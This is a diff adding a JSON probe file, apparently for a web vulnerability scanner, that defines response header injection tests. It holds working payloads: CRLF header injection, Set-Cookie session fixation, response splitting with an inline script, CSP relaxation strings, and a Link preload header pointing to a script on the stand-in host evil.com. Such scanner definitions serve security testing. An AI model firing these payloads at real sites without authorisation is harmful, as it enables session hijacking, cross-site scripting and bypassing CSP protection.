@@ -1,0 +1,110 @@
+{
+  "category": "response_header_injection",
+  "description": "Response header injection beyond CRLF — injecting into existing response header values (Location, Content-Type, CSP, Link, X-Frame-Options) via user-controlled input that reaches those headers without newline sanitization. Chains with XSS (Content-Type text/html), cache poisoning (Cache-Control injection), and session fixation (Set-Cookie injection).",
+  "chain_with": ["crlf_injection", "xss", "cache_poisoning", "session_security"],
+  "contexts": {
+    "location_header_injection": {
+      "description": "User input reflected in the Location header value. Beyond open redirect — injecting headers after the Location value via CRLF, or manipulating the redirect URL to include attacker-controlled fragments/parameters.",
+      "tech_match": [],
+      "param_match": ["url", "redirect", "next", "return", "returnTo", "redirect_uri", "continue", "goto", "dest"],
+      "probes": [
+        {
+          "payload": "http://evil.com%0d%0aX-Injected: true",
+          "description": "CRLF in redirect parameter — inject a custom header after Location value",
+          "matchers": [
+            {"type": "header", "name": "X-Injected", "description": "Injected header appears in response"},
+            {"type": "status", "status": [301, 302, 303, 307, 308]}
+          ],
+          "severity": "high",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "http://evil.com%0d%0aSet-Cookie:%20session=attacker",
+          "description": "CRLF in redirect to inject Set-Cookie — session fixation via response header injection",
+          "matchers": [
+            {"type": "regex", "pattern": "Set-Cookie:.*session=attacker", "description": "Injected Set-Cookie appears in response headers"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80
+        },
+        {
+          "payload": "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>",
+          "description": "Response splitting via CRLF — inject a complete response body with Content-Type text/html for XSS",
+          "matchers": [
+            {"type": "reflection", "description": "Script tag reflected in response body after header injection"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85
+        }
+      ]
+    },
+    "content_type_manipulation": {
+      "description": "Manipulate the Content-Type header to force browsers to interpret API responses as HTML. If user input influences the response Content-Type (e.g. via Accept header reflection, format parameter, or file extension routing), an attacker can trigger XSS on JSON/XML endpoints.",
+      "tech_match": ["express", "spring", "django", "flask", "fastapi", "rails"],
+      "param_match": ["format", "type", "content_type", "accept", "output", "ext"],
+      "probes": [
+        {
+          "payload": "text/html",
+          "description": "Set format/type parameter to text/html — if reflected in Content-Type, browser renders JSON body as HTML",
+          "matchers": [
+            {"type": "header_change", "name": "Content-Type", "description": "Content-Type changed to text/html"},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "{{endpoint}}.html",
+          "description": "Append .html extension to API endpoint — some frameworks route based on extension and set Content-Type accordingly",
+          "matchers": [
+            {"type": "regex", "pattern": "Content-Type:.*text/html", "description": "Response served as text/html via extension routing"},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "csp_injection": {
+      "description": "Content-Security-Policy header injection — if user input reaches the CSP header value (e.g. via a nonce, report-uri, or dynamic policy construction), an attacker can relax the policy to allow inline scripts or external script loading.",
+      "tech_match": ["csp", "express", "django", "rails", "next.js"],
+      "param_match": ["nonce", "report_uri", "policy", "csp"],
+      "probes": [
+        {
+          "payload": "test%3B%20script-src%20*",
+          "description": "Inject semicolon + script-src * into CSP value — if reflected, CSP is relaxed to allow all scripts",
+          "matchers": [
+            {"type": "regex", "pattern": "Content-Security-Policy:.*script-src \\*", "description": "CSP relaxed via injection — script-src * in policy"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "test%3B%20script-src%20%27unsafe-inline%27",
+          "description": "Inject unsafe-inline into CSP — enables inline script execution, bypassing the CSP protection entirely",
+          "matchers": [
+            {"type": "regex", "pattern": "Content-Security-Policy:.*unsafe-inline", "description": "CSP relaxed via injection — unsafe-inline in script-src"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "link_header_injection": {
+      "description": "Link header injection — inject <preload> or <prefetch> directives via user-controlled input in the Link response header. Can preload attacker-controlled scripts or exfiltrate data via DNS prefetch.",
+      "tech_match": ["nginx", "apache", "cloudflare", "fastly", "cdn"],
+      "param_match": ["url", "link", "rel", "resource", "preload"],
+      "probes": [
+        {
+          "payload": "test%3E%3B%20%3Chttp://evil.com/x.js%3E%3B%20rel=preload%3B%20as=script",
+          "description": "Inject a preload Link header pointing to an attacker script — browser may preload the script",
+          "matchers": [
+            {"type": "regex", "pattern": "Link:.*evil\\.com.*preload", "description": "Attacker-controlled preload link injected into Link header"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    }
+  }
+}
